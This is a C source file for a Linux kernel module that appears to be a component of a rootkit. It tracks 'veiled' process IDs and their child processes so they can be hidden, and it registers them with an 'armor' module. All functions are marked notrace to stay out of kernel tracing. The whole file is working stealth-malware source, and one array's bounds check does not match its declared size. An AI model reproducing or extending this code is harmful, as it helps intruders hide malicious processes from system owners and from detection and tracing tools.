#include "../include/ub_core.h"
#include "../include/veiled_pids.h"
#include "../include/armor.h"

int ub_offspring_pids[UB_MAX_VEILED_PIDS*128];
int ub_veiled_pids[UB_MAX_VEILED_PIDS];
u64 ub_veiled_start_times[UB_MAX_VEILED_PIDS];
u64 ub_offspring_start_times[UB_MAX_OFFSPRING_PIDS];
int ub_veiled_count = 0;
int ub_offspring_count = 0;
static DEFINE_SPINLOCK(ub_veil_lock);

notrace int ub_veiled_pid_count(void)
{
    unsigned long flags;
    int count;

    spin_lock_irqsave(&ub_veil_lock, flags);
    count = ub_veiled_count;
    spin_unlock_irqrestore(&ub_veil_lock, flags);

    return count;
}

notrace int ub_offspring_pid_count(void)
{
    unsigned long flags;
    int count;

    spin_lock_irqsave(&ub_veil_lock, flags);
    count = ub_offspring_count;
    spin_unlock_irqrestore(&ub_veil_lock, flags);

    return count;
}

notrace int ub_veiled_pids_snapshot(int *dst, int max_entries)
{
    unsigned long flags;
    int n;

    if (!dst || max_entries <= 0)
        return 0;

    spin_lock_irqsave(&ub_veil_lock, flags);
    n = ub_veiled_count;
    if (n > UB_MAX_VEILED_PIDS)
        n = UB_MAX_VEILED_PIDS;
    if (n > max_entries)
        n = max_entries;
    if (n > 0)
        memcpy(dst, ub_veiled_pids, n * sizeof(int));
    spin_unlock_irqrestore(&ub_veil_lock, flags);

    return n;
}

notrace int ub_offspring_pids_snapshot(int *dst, int max_entries)
{
    unsigned long flags;
    int n;

    if (!dst || max_entries <= 0)
        return 0;

    spin_lock_irqsave(&ub_veil_lock, flags);
    n = ub_offspring_count;
    if (n > UB_MAX_OFFSPRING_PIDS)
        n = UB_MAX_OFFSPRING_PIDS;
    if (n > max_entries)
        n = max_entries;
    if (n > 0)
        memcpy(dst, ub_offspring_pids, n * sizeof(int));
    spin_unlock_irqrestore(&ub_veil_lock, flags);

    return n;
}

notrace void ub_offspring_track(int pid) {
    unsigned long flags;
    int i;
    struct task_struct *task;
    struct task_struct *leader;
    u64 start_time_ns = 0;

    if (pid <= 0)
        return;

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        leader = rcu_dereference(task->group_leader);
        if (!leader)
            leader = task;
        start_time_ns = READ_ONCE(leader->start_time);
    }
    rcu_read_unlock();

    spin_lock_irqsave(&ub_veil_lock, flags);
    for (i = 0; i < ub_offspring_count; i++) {
        if (ub_offspring_pids[i] == pid) {
            if (start_time_ns)
                ub_offspring_start_times[i] = start_time_ns;
            goto out;
        }
    }

    if (ub_offspring_count < UB_MAX_VEILED_PIDS*128) {
        ub_offspring_pids[ub_offspring_count++] = pid;
        ub_offspring_start_times[ub_offspring_count - 1] = start_time_ns;
    }
out:
    spin_unlock_irqrestore(&ub_veil_lock, flags);
}

notrace int ub_is_offspring(int pid) {
    unsigned long flags;
    int i;
    int found = 0;

    if (pid <= 0)
        return 0;

    spin_lock_irqsave(&ub_veil_lock, flags);
    for (i = 0; i < ub_offspring_count; i++) {
         if (ub_offspring_pids[i] == pid)
             found = 1;
         if (found)
             break;
    }
    spin_unlock_irqrestore(&ub_veil_lock, flags);

    return found;
}

notrace void ub_veil_pid(int pid) {
    unsigned long flags;
    int i;
    struct task_struct *task;
    struct task_struct *leader;
    struct task_struct *task_ref = NULL;
    u64 start_time_ns = 0;

    if (pid <= 0)
        return;

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        leader = rcu_dereference(task->group_leader);
        if (!leader)
            leader = task;
        start_time_ns = READ_ONCE(leader->start_time);
        get_task_struct(task);
        task_ref = task;
    }
    rcu_read_unlock();

    spin_lock_irqsave(&ub_veil_lock, flags);
    for (i = 0; i < ub_veiled_count; i++) {
         if (ub_veiled_pids[i] == pid) {
             if (start_time_ns)
                 ub_veiled_start_times[i] = start_time_ns;
             goto out;
         }
    }

    if (ub_veiled_count < UB_MAX_VEILED_PIDS) {
        ub_veiled_pids[ub_veiled_count++] = pid;
        ub_veiled_start_times[ub_veiled_count - 1] = start_time_ns;
    }
out:
    spin_unlock_irqrestore(&ub_veil_lock, flags);

    if (task_ref) {
        ub_armor_register_hidden_task(task_ref);
        put_task_struct(task_ref);
    }
}

notrace int ub_is_veiled(int pid) {
    unsigned long flags;
    int i;
    int found = 0;

    if (pid <= 0)
        return 0;

    spin_lock_irqsave(&ub_veil_lock, flags);
    for (i = 0; i < ub_veiled_count; i++) {
         if (ub_veiled_pids[i] == pid)
             found = 1;
         if (found)
             break;
    }
    spin_unlock_irqrestore(&ub_veil_lock, flags);

    return found;
}

notrace int ub_pid_is_thread(int tid) {
    struct task_struct *task;
    int tgid = 0;

    if (tid <= 0)
        return 0;

    rcu_read_lock();
    task = pid_task(find_vpid(tid), PIDTYPE_PID);
    if (task)
        tgid = task->tgid;
    rcu_read_unlock();

    if (tgid == 0 || tgid == tid)
        return 0;

    return ub_is_veiled(tgid) || ub_is_offspring(tgid);
}
